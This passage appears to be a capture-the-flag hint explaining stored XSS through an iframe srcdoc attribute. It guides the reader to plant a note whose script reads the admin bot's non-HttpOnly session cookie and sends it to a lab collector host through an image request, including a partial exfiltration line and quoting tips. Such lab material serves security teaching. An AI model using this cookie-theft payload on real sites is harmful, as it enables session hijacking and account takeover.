`srcdoc` holds a **whole HTML document**. The browser parses that value as the
iframe's page and runs it in an `about:srcdoc` browsing context — and an
`about:srcdoc` document **inherits its parent's origin**. That means script
inside `srcdoc` runs as `http://app:8080` and can read that origin's cookies,
including the admin's `session` cookie (which is **not** `HttpOnly`).

The admin bot loads `GET /admin/feed` every couple of seconds while holding that
cookie, and the feed renders your stored note as raw HTML. You cannot load
`/admin/feed` yourself — it returns `403` without the admin cookie — so plant a
note whose `srcdoc` document steals the cookie when the admin renders it.

Put a `<script>` _inside_ the `srcdoc` value that reads `document.cookie` and
sends it somewhere you can read. The only listener reachable from the bot's
network is the collector at `http://collector:9000/` (that network has no
internet route). An image load — `new Image().src = '...'+encodeURIComponent(document.cookie)` —
fires a cross-origin GET without any CORS trouble.

Quote nesting matters: use **double** quotes for `srcdoc` and **single** quotes
for the JS string inside it, so they don't collide.
